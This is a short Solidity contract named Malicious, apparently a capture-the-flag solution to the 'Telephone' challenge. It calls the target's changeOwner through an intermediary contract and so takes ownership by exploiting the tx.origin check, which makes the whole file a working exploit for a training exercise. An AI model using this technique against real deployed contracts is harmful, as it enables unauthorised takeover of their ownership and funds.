// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Telephone.sol';

contract Malicious {
    Telephone public telephone;

    constructor(address telephone_) public {
        telephone = Telephone(telephone_);
    }

    function maliciousChangeOwner(address _owner) public {
        telephone.changeOwner(_owner);
    }
}